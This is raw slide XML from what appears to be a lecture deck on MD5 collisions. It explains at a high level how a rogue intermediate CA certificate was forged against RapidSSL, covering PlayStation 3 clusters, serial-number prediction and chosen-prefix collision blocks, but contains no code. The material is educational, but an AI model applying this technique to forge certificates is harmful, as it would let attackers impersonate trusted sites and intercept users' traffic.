            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="5943600" y="4038480"/>
              <a:ext cx="505080" cy="360"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="textAreaLeft" fmla="*/ 0 w 505080"/>
                <a:gd name="textAreaRight" fmla="*/ 505440 w 505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05460" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="0" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="505044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18" name="object 4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6346440" y="3972240"/>
              <a:ext cx="129960" cy="132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19" name="object 47"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="304920" y="5100480"/>
              <a:ext cx="3665519" cy="461880"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="textAreaLeft" fmla="*/ 0 w 3665520"/>
                <a:gd name="textAreaRight" fmla="*/ 3665880 w 3665520"/>
                <a:gd name="textAreaTop" fmla="*/ 0 h 461880"/>
                <a:gd name="textAreaBottom" fmla="*/ 462240 h 461880"/>
              </a:gdLst>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="textAreaLeft" t="textAreaTop" r="textAreaRight" b="textAreaBottom"/>
              <a:pathLst>
                <a:path w="3665854" h="462279" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="3665537" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="0" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="461961"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3665537" y="461961"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3665537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0" name="object 48"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="304920" y="5100480"/>
              <a:ext cx="3665519" cy="461880"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="textAreaLeft" fmla="*/ 0 w 3665520"/>
                <a:gd name="textAreaRight" fmla="*/ 3665880 w 3665520"/>
                <a:gd name="textAreaTop" fmla="*/ 0 h 461880"/>
                <a:gd name="textAreaBottom" fmla="*/ 462240 h 461880"/>
              </a:gdLst>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="textAreaLeft" t="textAreaTop" r="textAreaRight" b="textAreaBottom"/>
              <a:pathLst>
                <a:path w="3665854" h="462279" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="0" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="3665537" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3665537" y="461961"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="46196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6271575" name="object 49"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="383400" y="5133600"/>
            <a:ext cx="3472560" cy="743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Valid</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="24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4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both</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="24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certificates!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14477398" name="object 50"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="914400" y="3972240"/>
            <a:ext cx="2514600" cy="2352600"/>
            <a:chOff x="914400" y="3972240"/>
            <a:chExt cx="2514600" cy="2352600"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="623" name="object 51"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="934920" y="5620320"/>
              <a:ext cx="741240" cy="704520"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="textAreaLeft" fmla="*/ 0 w 741240"/>
                <a:gd name="textAreaRight" fmla="*/ 741600 w 741240"/>
                <a:gd name="textAreaTop" fmla="*/ 0 h 704520"/>
                <a:gd name="textAreaBottom" fmla="*/ 704880 h 704520"/>
              </a:gdLst>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="textAreaLeft" t="textAreaTop" r="textAreaRight" b="textAreaBottom"/>
              <a:pathLst>
                <a:path w="741680" h="704850" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="741442" y="704370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24" name="object 52"/>
            <p:cNvPicPr/>
            <p:nvPr/>
          </p:nvPicPr>
          <p:blipFill rotWithShape="1">
            <a:blip r:embed="rId4"/>
            <a:stretch/>
          </p:blipFill>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="914400" y="5600520"/>
              <a:ext cx="132480" cy="130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25" name="object 53"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="2695320" y="4038480"/>
              <a:ext cx="733680" cy="360"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="textAreaLeft" fmla="*/ 0 w 733680"/>
                <a:gd name="textAreaRight" fmla="*/ 734040 w 7336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34060" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="733644" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="0" y="0"/>
                  </a:lnTo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26" name="object 5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2666880" y="3972240"/>
              <a:ext cx="129960" cy="1321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33394912" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" idx="6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C33A9E9-9346-4396-B9C3-6C04C73C8712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613300" name="object 2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280210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Generating</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="4000" b="0" strike="noStrike" spc="-9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Collisions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628585" name="object 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="5184000" y="1176120"/>
            <a:ext cx="36057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73380" name="object 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="536040" y="2137680"/>
            <a:ext cx="3878280" cy="359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29880" rIns="0" bIns="0" anchor="t">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="12600">
              <a:lnSpc>
                <a:spcPts val="3328"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="235"/>
              </a:spcBef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1-2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days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cluster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of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200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PlayStation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3</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" strike="noStrike" spc="-26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54"/>
              </a:spcBef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2000"/>
              </a:lnSpc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Equivalent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8000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desktop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CPU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cores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or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300"/>
              </a:lnSpc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$20,000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Amazon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EC2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9074196" name="object 6"/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="4800600" y="1600200"/>
            <a:ext cx="3485880" cy="4647960"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="118088048" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" idx="6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C24BE806-E4D4-4827-8C35-B6A62A57F1DC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73975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717444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Generating</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="4000" b="0" strike="noStrike" spc="-11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Colliding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7637213" name="object 3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581401" name="object 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="536040" y="1058400"/>
            <a:ext cx="8451000" cy="6063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30320" rIns="0" bIns="0" anchor="t">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="4660920">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1026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144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RapidSSL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uses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fully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automated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system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$69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certificate,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issued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6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seconds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Sequential</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="24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numbers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Technique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generating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colliding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4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Get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with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number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Predict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time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when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RapidSSL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counter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goes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S+1000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Generate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collision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part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certificate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6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Shortly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before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time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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" strike="noStrike" spc="-7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buy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enough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(non-colliding)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increment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counter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S+999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820"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="740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colliding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request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time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get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number S+1000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918593" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" idx="6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15DCC934-4749-4AE7-98B7-5244A12F0E8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773813" name="object 2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951179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Creating</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="4000" b="0" strike="noStrike" spc="-6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Fake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Intermediate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CA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1477845" name="object 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="5184000" y="1176120"/>
            <a:ext cx="36057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165380" name="object 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="838080" y="167652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540695" name="object 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1285200" y="1755000"/>
            <a:ext cx="14022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serial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number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184613" name="object 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="838080" y="213372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582688" name="object 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1260000" y="2212200"/>
            <a:ext cx="14302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validity</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" strike="noStrike" spc="-114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period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929488" name="object 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="838080" y="2590920"/>
            <a:ext cx="2285640" cy="18284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828440"/>
              <a:gd name="textAreaBottom" fmla="*/ 1828800 h 1828440"/>
            </a:gdLst>
            <a:ahLst/>
            <a:cxnLst/>
            <a:rect l="textAreaLeft" t="textAreaTop" r="textAreaRight" b="textAreaBottom"/>
            <a:pathLst>
              <a:path w="2286000" h="18288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828799"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="18287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017247" name="object 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1145520" y="3143519"/>
            <a:ext cx="1668960" cy="97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58720" indent="-546120">
              <a:lnSpc>
                <a:spcPct val="117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real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cert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domain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name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020981" name="object 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="838080" y="4419720"/>
            <a:ext cx="2285640" cy="11426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2286000" h="11430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142999"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="11429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086545" name="object 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1551960" y="4629240"/>
            <a:ext cx="855000" cy="97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17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real</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="18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cert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18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key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034524" name="object 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="838080" y="556272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629490" name="object 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1107360" y="5641200"/>
            <a:ext cx="17388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X.509</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="18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extensions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535430" name="object 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="838080" y="601992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923074" name="object 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1501200" y="6098400"/>
            <a:ext cx="9590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signature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36222" name="object 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="5486400" y="1676520"/>
            <a:ext cx="2285640" cy="121896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218960"/>
              <a:gd name="textAreaBottom" fmla="*/ 1219320 h 1218960"/>
            </a:gdLst>
            <a:ahLst/>
            <a:cxnLst/>
            <a:rect l="textAreaLeft" t="textAreaTop" r="textAreaRight" b="textAreaBottom"/>
            <a:pathLst>
              <a:path w="2286000" h="1219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219199"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="1219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701942" name="object 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="5920560" y="2136240"/>
            <a:ext cx="14068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rogue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cert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96913" name="object 19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="5486400" y="2895480"/>
            <a:ext cx="2285640" cy="76176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2286000" h="7620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043917" name="object 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="5704920" y="3126600"/>
            <a:ext cx="18442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rogue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key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043253" name="object 21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="5486400" y="3657600"/>
            <a:ext cx="2285640" cy="76176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761760"/>
              <a:gd name="textAreaBottom" fmla="*/ 762120 h 761760"/>
            </a:gdLst>
            <a:ahLst/>
            <a:cxnLst/>
            <a:rect l="textAreaLeft" t="textAreaTop" r="textAreaRight" b="textAreaBottom"/>
            <a:pathLst>
              <a:path w="2286000" h="7620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85549" name="object 22"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="5832000" y="3724200"/>
            <a:ext cx="15984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rogue</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="18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3366FF"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>X.509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0002389" name="object 23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="6085800" y="4045680"/>
            <a:ext cx="10911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extensions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4618035" name="object 24"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="5486400" y="4419720"/>
            <a:ext cx="2285640" cy="1599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1599840"/>
              <a:gd name="textAreaBottom" fmla="*/ 1600200 h 1599840"/>
            </a:gdLst>
            <a:ahLst/>
            <a:cxnLst/>
            <a:rect l="textAreaLeft" t="textAreaTop" r="textAreaRight" b="textAreaBottom"/>
            <a:pathLst>
              <a:path w="2286000" h="1600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1600199"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="1600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29272" name="object 25"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="6897960" y="4588560"/>
            <a:ext cx="708480" cy="869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mment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95400">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="371"/>
              </a:spcBef>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" strike="noStrike" spc="-52">
                <a:solidFill>
                  <a:srgbClr val="3366FF"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>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7338" name="object 26"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="5577840" y="5227920"/>
            <a:ext cx="21135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(contents</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="18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3366FF"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>ignored</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="18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3366FF"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>by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943515" name="object 27"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="6123960" y="5558039"/>
            <a:ext cx="102060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browsers)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390841" name="object 28"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="5486400" y="6019920"/>
            <a:ext cx="2285640" cy="456840"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst>
              <a:gd name="textAreaLeft" fmla="*/ 0 w 2285640"/>
              <a:gd name="textAreaRight" fmla="*/ 2286000 w 22856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2286000" h="457200" fill="norm" stroke="1" extrusionOk="0">
                <a:moveTo>
                  <a:pt x="0" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="2285999" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2285999" y="457199"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="457199"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:noFill/>
          <a:ln w="15874">
            <a:solidFill>
              <a:srgbClr val="4180FF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489276" name="object 29"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="6149160" y="6098400"/>
            <a:ext cx="9590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signature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0942553" name="object 30"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="3124080" y="1676520"/>
            <a:ext cx="5665680" cy="4800240"/>
            <a:chOff x="3124080" y="1676520"/>
            <a:chExt cx="5665680" cy="4800240"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="667" name="object 31"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="3124080" y="441972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8"/>
                  </a:lnTo>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:noFill/>
            <a:ln w="6349">
              <a:solidFill>
                <a:srgbClr val="FF7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8" name="object 32"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="3124080" y="556272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7"/>
                  </a:lnTo>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:noFill/>
            <a:ln w="6349">
              <a:solidFill>
                <a:srgbClr val="FF7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9" name="object 33"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="3124080" y="647532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4" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="0" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="2362199" y="1586"/>
                  </a:lnTo>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:noFill/>
            <a:ln w="6349">
              <a:solidFill>
                <a:srgbClr val="008F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0" name="object 34"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="3124080" y="1676520"/>
              <a:ext cx="2361960" cy="1440"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="textAreaLeft" fmla="*/ 0 w 2361960"/>
                <a:gd name="textAreaRight" fmla="*/ 2362320 w 23619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362200" h="1905" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="0" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="2362199" y="1587"/>
                  </a:lnTo>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:noFill/>
            <a:ln w="6349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1" name="object 35"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="5486400" y="5562720"/>
              <a:ext cx="2285640" cy="1440"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="textAreaLeft" fmla="*/ 0 w 2285640"/>
                <a:gd name="textAreaRight" fmla="*/ 2286000 w 22856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286000" h="1904" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="0" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="2285999" y="1587"/>
                  </a:lnTo>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:noFill/>
            <a:ln w="6349">
              <a:solidFill>
                <a:srgbClr val="FF7C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2" name="object 36"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="7645320" y="4037040"/>
              <a:ext cx="202680" cy="144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03200" h="1904" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="0" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="203200" y="1411"/>
                  </a:lnTo>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:noFill/>
            <a:ln w="8312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3" name="object 37"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="7620120" y="3999600"/>
              <a:ext cx="76320" cy="7596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6834" h="76200" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="76462" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="0" y="37570"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="75933" y="76198"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="76462" y="0"/>
                  </a:lnTo>
                  <a:close/>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:solidFill>
              <a:srgbClr val="FF26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4" name="object 38"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="6907320" y="4290840"/>
              <a:ext cx="1882440" cy="866520"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="textAreaLeft" fmla="*/ 0 w 1882440"/>
                <a:gd name="textAreaRight" fmla="*/ 1882800 w 1882440"/>
                <a:gd name="textAreaTop" fmla="*/ 0 h 866520"/>
                <a:gd name="textAreaBottom" fmla="*/ 866880 h 866520"/>
              </a:gdLst>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="textAreaLeft" t="textAreaTop" r="textAreaRight" b="textAreaBottom"/>
              <a:pathLst>
                <a:path w="1882775" h="866775" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="1882775" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="0" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="866774"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1882775" y="866774"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1882775" y="0"/>
                  </a:lnTo>
                  <a:close/>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:solidFill>
              <a:srgbClr val="FFADD6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5" name="object 39"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="6907320" y="4290840"/>
              <a:ext cx="1882440" cy="866520"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="textAreaLeft" fmla="*/ 0 w 1882440"/>
                <a:gd name="textAreaRight" fmla="*/ 1882800 w 1882440"/>
                <a:gd name="textAreaTop" fmla="*/ 0 h 866520"/>
                <a:gd name="textAreaBottom" fmla="*/ 866880 h 866520"/>
              </a:gdLst>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="textAreaLeft" t="textAreaTop" r="textAreaRight" b="textAreaBottom"/>
              <a:pathLst>
                <a:path w="1882775" h="866775" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="0" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="1882774" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1882774" y="866774"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="86677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4">
              <a:solidFill>
                <a:srgbClr val="FF26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0923747" name="object 40"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="3142440" y="5727240"/>
            <a:ext cx="233568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indent="406439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identical</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" strike="noStrike" spc="-75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1">
                <a:solidFill>
                  <a:srgbClr val="165E0C"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>bytes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(copied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from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1">
                <a:solidFill>
                  <a:srgbClr val="165E0C"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>real</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" strike="noStrike" spc="-32">
                <a:solidFill>
                  <a:srgbClr val="165E0C"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" strike="noStrike" spc="-21">
                <a:solidFill>
                  <a:srgbClr val="165E0C"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>cert)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647616" name="object 47"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="8443440" y="6478560"/>
            <a:ext cx="550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2600">
              <a:lnSpc>
                <a:spcPts val="1426"/>
              </a:lnSpc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r>
              <a:rPr lang="en-US" sz="1200" b="0" strike="noStrike" spc="-26">
                <a:solidFill>
                  <a:srgbClr val="3366FF"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>54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909341" name="object 41"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="3645720" y="4711320"/>
            <a:ext cx="130140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0760" indent="-38160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FF8029"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>collision</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" strike="noStrike" spc="-60">
                <a:solidFill>
                  <a:srgbClr val="FF8029"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" strike="noStrike" spc="-21">
                <a:solidFill>
                  <a:srgbClr val="FF8029"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>bits </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" strike="noStrike" spc="-11">
                <a:solidFill>
                  <a:srgbClr val="FF8029"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>(computed)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941834" name="object 42"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="3648960" y="2806200"/>
            <a:ext cx="1401120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88920" indent="-76320">
              <a:lnSpc>
                <a:spcPct val="119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FF0000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>chosen</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" strike="noStrike" spc="-60">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
